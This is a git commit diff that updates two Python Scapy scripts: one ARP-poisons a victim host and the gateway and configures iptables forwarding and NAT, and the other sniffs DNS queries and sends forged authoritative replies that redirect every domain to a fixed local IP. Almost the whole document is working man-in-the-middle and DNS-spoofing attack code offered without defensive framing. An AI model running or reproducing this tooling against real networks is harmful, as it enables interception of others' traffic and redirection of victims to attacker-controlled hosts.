d997f9ea92bcef815b355f0fed66e56185bb515c
Craig West <cawest1221@gmail.com>
2014-12-07 22:41:05 -0500

    updated

--- dns_spoof.py
+++ dns_spoof.py
@@ -11,54 +11,90 @@ import time
 import sys
 import os
 
-conf.iface = 'mon0'
+conf.iface = 'eth0'
 spoofed_ip = '192.168.1.7'
 
 
-def send_response(resp):
-    req_domain = resp[DNS].qd.qname
-    logging.info("Found request for {0}".format(req_domain))
+def send_response(packet):
 
-    del(resp[UDP].len)
-    del(resp[UDP].chksum)
-    del(resp[IP].len)
-    del(resp[IP].chksum)
+    # if the sniffed packet is a DNS Query
+    if packet[DNS].qr == 0 \
+        and packet[DNS].qd.qtype == 1 \
+        and packet[DNS].qd.qclass == 1:
 
-    response = resp.copy()
+        query = packet[DNS].qd.qname
 
-    response.FCfield = 2L
-    response[Ether].src, response[Ether].dst = resp[Ether].dst, resp[Ether].src
-    response[IP].src, response[IP].dst = resp[IP].dst, resp[IP].src
-    response.sport, response.dport = resp.dport, resp.sport
+        #print the name of the website that is being queried
+        logging.info("Found request for {0}".format(query))
 
-    response[DNS].qr = 1L
-    response[DNS].ra = 1L
-    response[DNS].ancount = 1
-    response[DNS].an = DNSRR(
-            rrname = req_domain,
-            type = 'A',
-            rclass = 'IN',
-            ttl = 900,
-            rdata = spoofed_ip
-            )
-    del(response[IP].len)
-    del(response[UDP].len)
-    del(response[UDP].chksum)
+        #Create the IP header, set the src from the router
+        #the dest will be the port the query came from
+        spoofed_ip_packet = IP(src='192.168.1.1',dst=packet.getlayer(IP).src)
 
-    sendp(response)
-    logging.info("Send Response: {0} -> {1}".format(req_domain, spoofed_ip))
+        #Create the UDP header with a source port of 53
+        #the dest port will the same port from the query
+        spoofed_udp_packet = UDP(sport=53,dport=packet.getlayer(UDP).sport)
+
+        #Here we create the DNS packet based off of the RFC 1035 pages 24-27
+        #                                1  1  1  1  1  1
+        #  0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|                      ID                       |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|                    QDCOUNT                    |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|                    ANCOUNT                    |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|                    NSCOUNT                    |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+        #|                    ARCOUNT                    |
+        #+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
+
+        spoofed_dns_pakcet = DNS(
+            id=packet[DNS].id,          #id to match up replies
+            qr=1,                       #query or response
+            opcode=packet[DNS].opcode,  #the kind of query
+            aa=1,                       #specifies that the responding name server is an authority for the domain name
+            rd=0,                       #No Recursion Desired
+            ra=0,                       #No Recursion Available
+            z=0,                        #Reserved for future, must be 0
+            rcode=0,                    #Response code - No error condition
+            qdcount=packet[DNS].qdcount,#specifying the number of entries
+            ancount=1,                  #specifying the number of resource records
+            nscount=1,                  #specifying the number of name server resource records
+            arcount=1,                  #specifying the number of resource records in the additional records
+            qd=DNSQR(qname=query,qtype=packet[DNS].qd.qtype,qclass=packet[DNS].qd.qclass),  #The Question Section
+            an=DNSRR(rrname=query,rdata='192.168.1.7',ttl=86400),                           #Resource Record
+            ns=DNSRR(rrname=query,type=2,ttl=86400,rdata='192.168.1.7'),                    #Resource Record
+            ar=DNSRR(rrname=query,rdata='192.168.1.7'))                                     #Resource Record
+
+        logging.info("Send Response: {0} -> {1}".format(query, spoofed_ip))
+        send(spoofed_ip_packet/spoofed_udp_packet/spoofed_dns_pakcet)
+
+    else:
+        pass
+
+
+
 
 def main():
-    print("Starting...")
+    logging.info("Starting...")
     mitm.main()
-    #sniff(prn=lambda x: send_response(x),
-    #        lfilter=lambda x: x.haslayer(UDP) and x.dport == 53)
+    sniff(prn=lambda x: send_response(x),
+            lfilter=lambda x: x.haslayer(DNS) and x.dport == 53)
 
 if __name__ == "__main__":
     logging.basicConfig(format='%(levelname)s: %(message)s',
             level=logging.DEBUG)
     if os.geteuid() != 0:
-        logging.info("[-] You must be root to run this.")
+        logging.error("[-] You must be root to run this.")
         sys.exit(1)
+
+    def signal_handler(signal, frame):
+        mitm.forward_ip(False)
+        sys.exit(0)
+    signal.signal(signal.SIGINT, signal_handler)
 
     main()
--- mitm.py
+++ mitm.py
@@ -10,44 +10,70 @@ import signal
 import sys
 
 conf.iface='eth0'
+thrds = []
 
 def forward_ip(enabled=True):
     with open('/proc/sys/net/ipv4/ip_forward', 'w') as fw:
-        val = '1' if enabled else '0'
+        #make sure traffic can flow through the machine
+        if enabled:
+            val = '1'
+            os.system("/sbin/iptables -F")
+            os.system("/sbin/iptables -X")
+            os.system("/sbin/iptables -A FORWARD --in-interface eth0 -j ACCEPT")
+            os.system("/sbin/iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
+        #Resume normal traffic
+        else:
+            val = '0'
+            os.system("/sbin/iptables -F")
+            os.system("/sbin/iptables -X")
+            os.system("/sbin/iptables -t nat -F")
+            os.system("/sbin/iptables -t nat -X")
         ret = subprocess.Popen(['echo', val], stdout=fw)
         if ret == 1:
             logging.error('ERROR SETTING IP FORWARDING')
             sys.exit(1)
 
+#Creates ARP packets and sends them out
 def spoof(victim, gateway):
     packet = ARP()
     packet.psrc = gateway
     packet.pdst = victim
 
-    print("Spoofing: {0}".format(self.packet.pdst))
+    packet2 = ARP()
+    packet2.psrc = victim
+    packet2.pdst = gateway
+
+    print("Spoofing: {0}".format(packet.pdst))
     try:
         while True:
-            send(self.packet, verbose=0)
+            send(packet, verbose=0)
+            send(packet2, verbose=0)
             sleep(5)
     except:
         pass
 
 def main():
+    global thrds
     base = '192.168.1.'
     router = base + '1'
-    targets = map(lambda x: base + str(x), range(2,20))
+    targets = map(lambda x: base + str(x), [10])
 
     forward_ip()
 
+    #Create a thread for each IP in the targets
     for ip in targets:
-        #Thread(target=spoof, args=(ip,router,)).start()
-        print ip
+        t = Thread(target=spoof, args=(ip,router,))
+        thrds.append(t)
+        t.start()
+
+    for x in thrds:
+        x.join()
 
 
 if __name__ == '__main__':
     logging.basicConfig(format='%(levelname)s: %(message)s', level=logging.DEBUG)
     if os.geteuid() != 0:
-        logging.info("[-] You must be root")
+        logging.error("[-] You must be root")
         sys.exit(1)
 
     def signal_handler(signal, frame):
